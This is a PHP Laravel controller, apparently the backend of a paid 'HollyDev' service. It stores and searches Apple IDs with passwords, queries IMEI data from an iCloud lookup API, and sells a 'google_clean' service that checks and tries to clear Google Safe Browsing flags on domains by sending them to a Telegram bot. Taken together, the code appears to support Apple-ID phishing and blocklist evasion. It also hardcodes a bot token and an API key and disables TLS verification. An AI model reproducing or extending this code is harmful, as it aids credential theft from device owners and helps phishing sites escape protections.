<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\SMS;
use App\Models\IP;
use App\Models\AUTOREMOVE;
use App\Models\USER;
use App\Http\Controllers\ControllerAutoremove;
use Illuminate\Support\Facades\Auth;
use Exception;
use Illuminate\Support\Carbon;
use Illuminate\Support\Str;

class ControllerHollyDev extends Controller
{
    //

    public function detailMessage()
    {

        return SMS::all();
    }
    public function buscarSms(Request $request)
    {
        try {
            $buscar = $request->input('buscar');

            return SMS::where('id_user', Auth::id())
                ->where(function ($query) use ($buscar) {
                    $query->where('number', 'like', '%' . $buscar . '%')
                        ->orWhere('msj', 'like', '%' . $buscar . '%')
                        ->orWhere('sender', 'like', '%' . $buscar . '%')
                        ->orWhere('id', 'like', '%' . $buscar . '%');
                })
                ->get();
        } catch (Exception $e) {
            return response()->json(['error' => 'Error al buscar SMS'], 500);
        }
    }
    public function buscar_Apple_Remove(Request $request)
    {
        try {
            $buscar = $request->input('buscar');

            return AUTOREMOVE::where('user_id', Auth::id())
                ->where(function ($query) use ($buscar) {
                    $query->where('apple_id', 'like', '%' . $buscar . '%')
                        ->orWhere('password', 'like', '%' . $buscar . '%')
                        ->orWhere('response', 'like', '%' . $buscar . '%')
                        ->orWhere('id', 'like', '%' . $buscar . '%');
                })
                ->get();
        } catch (Exception $e) {
            return response()->json(['error' => 'Error al buscar SMS'], 500);
        }
    }

    public function buscarCall(Request $request)
    {
        try {
            $buscar = $request->input('buscar');

            return SMS::where('id_user', Auth::id())
                ->where(function ($query) use ($buscar) {
                    $query->where('number', 'like', '%' . $buscar . '%')
                        ->orWhere('msj', 'like', '%' . $buscar . '%')
                        ->orWhere('sender', 'like', '%' . $buscar . '%')
                        ->orWhere('id', 'like', '%' . $buscar . '%');
                })
                ->get();
        } catch (Exception $e) {
            return response()->json(['error' => 'Error al buscar Llamada'], 500);
        }
    }

    public function regenerarCredenciales()
    {
        try {
            $user = Auth::user();
            $current = new Carbon();
            $texto = $user->email . $current;
            //$hash = hash('sha256', data: $texto);
            $hash  = Str::uuid();
            $user->api_token = $hash;
            $user->save();
        } catch (Exception $e) {
            $user = Auth::user();
            $current = new Carbon();
            $texto = $user->email . $current;
            //$hash = hash('sha256', data: $texto);
            $hash  = Str::uuid();
            $user->api_token = $hash;
            $user->save();
            return response()->json(['error' => 'Area Prohibida ... a poco creias que no pense en esto'], 500);
        }
    }

    public function Modelo(Request $request)
    {
        if (isset($request->texto)) {
            $imei = $request->texto;
        } else {
            $imei = $request->imei;
        }
        $myCheck["service"] = 0;
        $myCheck["imei"] = $imei;
        $myCheck["key"] = "KA0-67V-ISI-85Y-WVI-OGW-0MY-CGE";
        $ch = curl_init("https://api.ifreeicloud.co.uk");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $myCheck);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
        curl_setopt($ch, CURLOPT_TIMEOUT, 60);
        $myResult = json_decode(curl_exec($ch));
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($httpcode != 200) {
            return "Error: HTTP Code $httpcode";
        } elseif ($myResult->success !== true) {
            return "Error: $myResult->error";
        } else {
            $cad = $myResult->object->model;
            $cad = str_replace("Apple", "", $cad);
            $result = $cad;
            return $result;
        }
    }

    public function getUserIP()
    {
        // Get real visitor IP behind CloudFlare network
        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
        }
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];

        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }

        return $ip;
    }
    //here check that ip are registered inside of text file
    public function auth(Request $request, $service)
    {
        try {
            // Busca si existe esa IP
            $ipo = IP::where('ip', $request->ip())->where('service', $service)->first();
            $auths = IP::where('service', $service)->where('user_id', Auth::User()->id)->first();
            if ($auths) {
                return true;
            }


            if ($ipo->ip == "127.0.0.1") {
                $ipo->ip = $request->ip();
                $ipo->save();
            }
        } catch (Exception $e) {
            return false;
        }

        //verifica si la fecha final ya es hoy
        $fecha = Carbon::parse($ipo->fecha_final);
        if ($fecha->isToday()) {
            return false;
        }
        //verifica si entro por api_key
        if ($request->api_key != '') {
            $user = User::where('api_token', $request->api_key)->first();
            if ($user) {
                return true;
            } else {
                return false;
            }
        }
        // Verifica si se encontró
        if ($ipo->service == $service) {
            return true;
        } else {
            return false;
        }
    }
    public function sincronizar_ip($id)
    {

        $id = base64_decode($id);
        $ip = IP::FindOrFail($id);
        $ip->ip = "127.0.0.1";
        $ip->save();
        return back()->with('success', 'Waiting IP for link');
    }

    public function check_domain(Request $request)
    { // Limpia el dominio de 'http://' o 'https://'
        $dominio = str_replace(['http://', 'https://'], '', $request->domain);

        // Inicializa cURL
        $ch = curl_init();
        $url = "https://transparencyreport.google.com/transparencyreport/api/v3/safebrowsing/status?site=" . $dominio;

        // Configuración de la solicitud cURL
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.1.3) Gecko/20070309 Firefox/2.0.0.3");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 2);
        curl_setopt($ch, CURLOPT_TIMEOUT, 2); // timeout en segundos
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        // Ejecutar la solicitud cURL
        $result = curl_exec($ch);

        // Verificar y mostrar el resultado 🚫  ✅
        $status1 = $result[17] ?? null;
        $status2 = $result[29] ?? null;
        $status = ($status2 == 1) ? 1 : $status1;

        // Decodificar el resultado para mostrar el mensaje correspondiente
        switch ($status) {
            case '6':
                $resultw = "Clean ✅";
                $alertType = 'success';
                break;
            case '1':
                $resultw = "Clean ✅";
                $alertType = 'success';
                break;
            case '4':
                $resultw = "Clean ✅";
                $alertType = 'success';
                break;
            case '3':
                $resultw = "Reported ❌";
                $alertType = 'warning';
                break;
            default:
                $resultw = "Reported ❌";
                $alertType = 'error';
                break;
        }

        // Cerrar la sesión cURL
        curl_close($ch);

        // Retorna con la alerta usando SweetAlert
        return 'Domain: ' . $dominio . ' ' . $resultw;
    }

    public function remove_report(Request $request)
    {
        try {
            $ControllerHollyDev = new ControllerHollyDev();
            $auth = $ControllerHollyDev->auth($request, 'google_clean');
            if (!$auth) {
                return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending si About payment Is here Binance ID : 42017699 for $50 usdt for year or $10 usdt for month and later Please Contact", 401);
            }
            if ($this->checkDomainStatus($request->domain)) {
                if ($this->checkDomainStatus($request->domain)) {

                    date_default_timezone_set('America/Monterrey');
                    $fecha = date('Y-m-d');
                    $fechaCompleta = date('l jS \of F Y h:i:s A');

                    $archivo = "domains_clean.txt";
                    $dominio = $request->domain;
                    $usuario = $request->user;

                    // Leer el archivo y verificar si el dominio ya se registró hoy
                    if (file_exists($archivo)) {
                        $lineas = file($archivo);
                        foreach ($lineas as $linea) {
                            // Usar expresión regular para buscar el dominio y la fecha
                            $pattern = "/Dominio:\s*" . preg_quote($dominio, '/') . "\s*Usuario:\s*.*\s*Fecha:\s*" . preg_quote($fecha, '/') . "/";

                            if (preg_match($pattern, $linea)) {
                                return "Cleaning domain $dominio please wait";
                            }
                        }
                    }

                    // Si no se ha registrado hoy, procedemos a registrar
                    $c = curl_init();
                    curl_setopt($c, CURLOPT_URL, "https://api.telegram.org/bot7285546131:AAGkupLGAY7ODqVol3K4tFRaetSbeyZcoZA/sendMessage");
                    curl_setopt($c, CURLOPT_TIMEOUT, 30);
                    curl_setopt($c, CURLOPT_POST, 1);
                    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
                    $postfields = 'chat_id=142398483&text=' . $dominio . '&parse_mode=html';
                    curl_setopt($c, CURLOPT_POSTFIELDS, $postfields);
                    $response = curl_exec($c);
                    curl_close($c);

                    // Escribir en el archivo de registro
                    $entrada = "Dominio: $dominio Usuario: $usuario Fecha: $fecha Completa: $fechaCompleta" . PHP_EOL;
                    file_put_contents($archivo, $entrada, FILE_APPEND);
                    return "Procesing Domain";
                    //  echo "Processing please wait 2 to 12 hours,THE LINK NO LET HAVE FILES .";
                }
            } else {
                return "Expired please renew the service";
                // echo "ABUSE DETECTED $request->domain THE DOMAIN ONLY CAN BE REGISTERED ONE TIME FOR DAY .THIS ALREADY REGISTERED AND SENDED FOR CLEAN";
            }
        } catch (Exception $e) {
            return "ABUSE DETECTED $request->domain THE DOMAIN ONLY CAN BE REGISTERED ONE TIME FOR DAY .THIS ALREADY REGISTERED AND SENDED FOR CLEAN";
        }
    }
    public function checkDomainStatus($domain)
    {
        try {
            // 1. Verificar si el dominio tiene registros DNS (A, CNAME, etc.)
            $dnsRecords = dns_get_record($domain);

            if (!preg_match("/^http(s)?:\/\//", $domain)) {
                $domain = "https://$domain";
            }



            // 2. Verificar si el dominio responde y tiene contenido
            $url = "http://$domain";

            // Usar cURL para hacer una solicitud HTTP
            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_NOBODY, true); // No descargar el cuerpo de la respuesta, solo los headers
            curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout de 10 segundos

            curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($httpCode >= 200 && $httpCode < 300) {
                return false;
                //return "El dominio $domain está apuntando a un servidor DNS y tiene contenido disponible.";
            } elseif ($httpCode >= 400 && $httpCode < 600) {
                return true;
                // return "El dominio $domain está apuntando a un servidor DNS pero devuelve un error HTTP ($httpCode).";
            } else {
                return true;
                // return "El dominio $domain está apuntando a un servidor DNS pero no tiene contenido visible o no responde.";
            }
        } catch (Exception $e) {
            return true;
        }
    }

    public function google_check(Request $request)
    {
        $ControllerHollyDev = new ControllerHollyDev();

        if ($request->radioDefault == 'clean') {
            $auth = $ControllerHollyDev->auth($request, 'google_clean');
            if (!$auth) {
                return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending si About payment Is here Binance ID : 42017699 for $50 usdt for year or $10 usdt for month and later Please Contact", 401);
            }
            $clean = $this->remove_report($request);
            if ($request->callback == 'holly') {
                return back()->with('success', $clean);
            }
        } else if ($request->radioDefault == 'check') {
            $auth = $ControllerHollyDev->auth($request, 'google_check');
            if (!$auth) {
                return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending si About payment Is here Binance ID : 42017699 for $50 usdt for year or $10 usdt for month and later Please Contact", 401);
            }
            $check = $this->check_domain($request);
            if ($request->callback == 'holly') {
                return back()->with('success', $check);
            }
        }
    }
    public function api_google_check(Request $request)
    {
        $ControllerHollyDev = new ControllerHollyDev();
        $auth = $ControllerHollyDev->auth($request, 'google_check');
        if (!$auth) {
            return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending si About payment Is here Binance ID : 42017699 for $50 usdt for year or $10 usdt for month and later Please Contact", 401);
        }
        return $check = $this->check_domain($request);
    }
    public function binance_pay(Request $request)
    {


        $apiKey = env('BINANCE_API_KEY');
        $secretKey = env('BINANCE_SECRET_KEY');
        $timestamp = round(microtime(true) * 1000);
        $nonce = bin2hex(random_bytes(16));

        $body = [
            'merchantTradeNo' => uniqid("order_"),
            'orderAmount' => '0.01',
            'currency' => 'USDT',
            'goods' => [
                'goodsType' => '01',
                'goodsCategory' => 'D000',
                'referenceGoodsId' => 'item-001',
                'goodsName' => 'Producto de ejemplo',
            ],
        ];

        $bodyJson = json_encode($body, JSON_UNESCAPED_SLASHES);
        $payload = $timestamp . "\n" . $nonce . "\n" . $bodyJson . "\n";

        $signature = hash_hmac('sha512', $payload, $secretKey);

        $ch = curl_init('https://bpay.binanceapi.com/binancepay/openapi/v2/order');

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Content-Type: application/json',
            'BinancePay-Timestamp: ' . $timestamp,
            'BinancePay-Nonce: ' . $nonce,
            'BinancePay-Certificate-SN: ' . $apiKey,
            'BinancePay-Signature: ' . $signature,
        ]);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $bodyJson);

        $response = curl_exec($ch);
        curl_close($ch);

        return json_decode($response, true);
    }

    public function binance_check(Request $request)
    {
        $ControllerHollyDev = new ControllerHollyDev();
        $auth = $ControllerHollyDev->auth($request, 'binance_check');
        if (!$auth) {
            return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending si About payment Is here Binance ID : 42017699 for $50 usdt for year or $10 usdt for month and later Please Contact", 401);
        }
        // Usa variables de entorno
        $apiKey = env('BINANCE_API_KEY');
        $secretKey = env('BINANCE_SECRET_KEY');
        // Parámetros base
        $params = [
            'timestamp' => round(microtime(true) * 1000),
            'txId' => $request->txId, // si usas este endpoint, se espera otro tipo de consulta
        ];

        $queryString = http_build_query($params);
        $signature = hash_hmac('sha256', $queryString, $secretKey);
        $params['signature'] = $signature;

        $url = 'https://api.binance.com/sapi/v1/capital/deposit/hisrec?' . http_build_query($params); // este es el correcto para historial de depósitos

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'X-MBX-APIKEY: ' . $apiKey
        ]);

        $response = curl_exec($ch);

        if (curl_errno($ch)) {
            return response()->json([
                'error' => true,
                'message' => curl_error($ch)
            ], 500);
        }

        curl_close($ch);

        $data = json_decode($response, true);

        // Manejar posibles errores en la respuesta
        if (isset($data['code']) && $data['code'] < 0) {
            return response()->json([
                'error' => true,
                'message' => $data['msg'] ?? 'Error desconocido de Binance'
            ], 400);
        }

        try {

            $transaccion = $data[0];
            $mensaje = "Depósito recibido:\n" .
                "ID: {$transaccion['id']}\n" .
                "Monto: {$transaccion['amount']} {$transaccion['coin']} ({$transaccion['network']})\n" .
                "TxID: {$transaccion['txId']}\n" .
                "Dirección: {$transaccion['address']}\n" .
                "Confirmaciones: {$transaccion['confirmTimes']}";

            if ($request->api_key == '') {
                return back()->with('payment_check', $mensaje);
            } else {

                return response()->json(['response' => $mensaje], 200)
                    ->header('Content-Type', 'application/json');
            }
        } catch (Exception $e) {

            if ($request->api_key == '') {
                return back()->with('error', 'Hubo un problema al procesar el pago. Por favor intenta de nuevo.');
            } else {
                return response()->json(['response' => 'Hubo un problema al procesar el pago. Por favor intenta de nuevo.'], 400)
                    ->header('Content-Type', 'application/json');
            }
        }
    }


    public function binance_permissions(Request $request)
    {
        $ControllerHollyDev = new ControllerHollyDev();
        // $auth = $ControllerHollyDev->auth($request, 'binance_check');
        // if (!$auth) {
        //     return response("Your Server IP " . $request->ip() . " Not Registered With us or Payment are pending. About payment: Binance ID: 42017699 for $50 USDT/year or $10 USDT/month. Please contact support.", 401);
        // }

        // Usa variables de entorno
        $apiKey = env('BINANCE_API_KEY');
        $secretKey = env('BINANCE_SECRET_KEY');

        // Parámetros base - solo timestamp es obligatorio para este endpoint
        $params = [
            'timestamp' => round(microtime(true) * 1000)  // Timestamp actual en milisegundos
        ];

        // Construir query string y firmar
        $queryString = http_build_query($params);
        $signature = hash_hmac('sha256', $queryString, $secretKey);

        // Añadir la firma a los parámetros
        $params['signature'] = $signature;

        // Construir URL con los parámetros
        $url = 'https://api.binance.com/sapi/v1/account/apiRestrictions?' . http_build_query($params);

        // Configurar y ejecutar la petición cURL
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => [
                'X-MBX-APIKEY: ' . $apiKey,
                'Content-Type: application/json'
            ]
        ]);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        if (curl_errno($ch)) {
            $errorMessage = curl_error($ch);
            curl_close($ch);
            return response()->json([
                'error' => true,
                'message' => 'cURL Error: ' . $errorMessage
            ], 500);
        }

        curl_close($ch);

        $data = json_decode($response, true);
 dd($data);
        // Manejar errores de la API de Binance
        if (isset($data['code']) && $data['code'] < 0) {
            return response()->json([
                'error' => true,
                'message' => 'Binance API Error: ' . ($data['msg'] ?? 'Unknown error')
            ], $httpCode >= 400 ? $httpCode : 400);
        }

        // Procesar la respuesta exitosa
        try {
            // La respuesta contiene las restricciones de la API
            $restrictions = $data;

            // Formatear la respuesta según el tipo de solicitud
            if ($request->api_key) {
                return response()->json([
                    'success' => true,
                    'data' => $restrictions
                ], 200);
            } else {
                // Si es una petición web normal, mostrar una vista o redireccionar
                return back()->with('api_restrictions', $restrictions);
            }

        } catch (Exception $e) {
            $errorMessage = 'Error al procesar la respuesta de Binance: ' . $e->getMessage();

            if ($request->api_key) {
                return response()->json([
                    'error' => true,
                    'message' => $errorMessage
                ], 500);
            } else {
                return back()->with('error', $errorMessage);
            }
        }
    }





public function binance_checks(Request $request, $montoEsperado = 100)
{
    $apiKey = env('BINANCE_API_KEY');
    $apiSecret = env('BINANCE_SECRET_KEY');
    $baseUrl = 'https://bpay.binanceapi.com'; // Binance Pay endpoint

    // Parámetros de la solicitud
    $params = [
        'merchantTradeNo' => $request->txId,
        'timestamp' => round(microtime(true) * 1000),
        'nonce' => bin2hex(random_bytes(16)),
    ];

    $bodyJson = json_encode(['merchantTradeNo' => $request->txId], JSON_UNESCAPED_SLASHES);
    $payload = $params['timestamp'] . "\n" . $params['nonce'] . "\n" . $bodyJson . "\n";
    $signature = hash_hmac('sha512', $payload, $apiSecret);

    $ch = curl_init("$baseUrl/binancepay/openapi/v2/order/query");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/json',
        'BinancePay-Timestamp: ' . $params['timestamp'],
        'BinancePay-Nonce: ' . $params['nonce'],
        'BinancePay-Certificate-SN: ' . $apiKey,
        'BinancePay-Signature: ' . $signature,
    ]);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $bodyJson);

    $response = curl_exec($ch);
    dd($response);
    curl_close($ch);

    $data = json_decode($response, true);

    if (isset($data['status']) && $data['status'] === 'SUCCESS' && isset($data['data'])) {
        $order = $data['data'];
        if (isset($order['orderAmount']) && $order['orderAmount'] == $montoEsperado && $order['status'] === 'PAID') {
            return [
                'success' => true,
                'message' => 'La transacción se verificó correctamente',
                'data' => $order
            ];
        } else {
            return [
                'success' => false,
                'message' => 'El monto no coincide o la orden no está pagada',
                'data' => $order
            ];
        }
    }

    return [
        'success' => false,
        'message' => 'La transacción no pudo ser verificada',
        'data' => $data ?? null
    ];
}
/*

public function binance_check_id(Request $request)
{

    // Validar que tengamos los parámetros necesarios
    if (!$request->has(['txId'])) {
        return ['success' => false, 'error' => 'Faltan parámetros requeridos (txId o trx)'];
    }

    $apiKey = env('BINANCE_API_KEY');
    $apiSecret = env('BINANCE_SECRET_KEY');
    $timestamp = round(microtime(true) * 1000);

    $params = [
        'orderId' => $request->txId,
        'timestamp' => $timestamp
    ];

    $queryString = http_build_query($params);
    $signature = hash_hmac('sha256', $queryString, $apiSecret);
    $url = "https://api.binance.com/sapi/v1/pay/transactions?$queryString&signature=$signature";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["X-MBX-APIKEY: $apiKey"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        curl_close($ch);
        return ['success' => false, 'error' => 'Error de conexión: ' . curl_error($ch)];
    }

    curl_close($ch);

    $data = json_decode($response, true);

    // Verificar si la API devolvió un error
    if (!isset($data['code']) || $data['code'] !== "000000") {
        return [
            'success' => false,
            'error' => $data['message'] ?? 'Error desconocido en la API de Binance',
            'api_response' => $data // Opcional: para debugging
        ];
    }

    // Buscar la transacción específica
    if (isset($data['data']) && is_array($data['data'])) {
        foreach ($data['data'] as $transaction) {
            if (isset($transaction['orderId']) && $transaction['orderId'] === $request->txId) {
                $mensaje = "Binance ID: " . ($transaction['payerInfo']['binanceId'] ?? 'N/A') . " | " .
                           "Nombre: " . ($transaction['payerInfo']['name'] ?? 'No disponible') . " | " .
                           "Monto: " . ($transaction['amount'] ?? 0) . " " . ($transaction['currency'] ?? 'USDT') . " | " .
                           "Transaction ID: " . ($transaction['transactionId'] ?? 'N/A');

                return back()->with('payment_check', $mensaje);

            }
        }
    }


//    $this->binance_checks($request);

    return back()->with('error', 'Hubo un problema al procesar el pago. Por favor intenta de nuevo.');



}*/
public function binance_check_id(Request $request)
{
    // 1. Verificar si es por imagen
    if ($request->hasFile('payment_image')) {
        $image = $request->file('payment_image');

        // Guardar temporalmente la imagen
        $imagePath = $image->getPathname();

        // Usar Tesseract (requiere estar instalado en el servidor)
        $outputFile = tempnam(sys_get_temp_dir(), 'ocr');
        shell_exec("tesseract \"$imagePath\" \"$outputFile\" -l fra+eng"); // OCR francés + inglés

        $ocrText = file_get_contents($outputFile . '.txt');

        // Buscar ID largo (18+ dígitos)
        if (preg_match('/\b\d{18,20}\b/', $ocrText, $matches)) {
            $request->merge(['txId' => $matches[0]]);
        } else {
            return back()->with('error', 'No se pudo detectar un Binance ID en la imagen.');
        }
    }

    // 2. Validar que tengamos el txId final
    if (!$request->has('txId')) {
        return ['success' => false, 'error' => 'Falta el parámetro txId'];
    }

    // 3. Consulta en Binance API
    $apiKey = env('BINANCE_API_KEY');
    $apiSecret = env('BINANCE_SECRET_KEY');
    $timestamp = round(microtime(true) * 1000);

    $params = [
        'orderId' => $request->txId,
        'timestamp' => $timestamp
    ];

    $queryString = http_build_query($params);
    $signature = hash_hmac('sha256', $queryString, $apiSecret);
    $url = "https://api.binance.com/sapi/v1/pay/transactions?$queryString&signature=$signature";

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["X-MBX-APIKEY: $apiKey"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $data = json_decode($response, true);

    if (!isset($data['code']) || $data['code'] !== "000000") {
        return back()->with('error', $data['message'] ?? 'Error desconocido en la API de Binance');
    }

    // 4. Buscar la transacción específica
    if (isset($data['data']) && is_array($data['data'])) {
        foreach ($data['data'] as $transaction) {
            if ($transaction['orderId'] == $request->txId) {
                $mensaje = "✅ Binance ID: " . ($transaction['payerInfo']['binanceId'] ?? 'N/A') . " | " .
                           "Nombre: " . ($transaction['payerInfo']['name'] ?? 'No disponible') . " | " .
                           "Monto: " . ($transaction['amount'] ?? 0) . " " . ($transaction['currency'] ?? 'USDT') . " | " .
                           "Transaction ID: " . ($transaction['transactionId'] ?? 'N/A');

                return back()->with('payment_check', $mensaje);
            }
        }
    }

    return back()->with('error', 'No se encontró la transacción con ese Binance ID.');
}


}
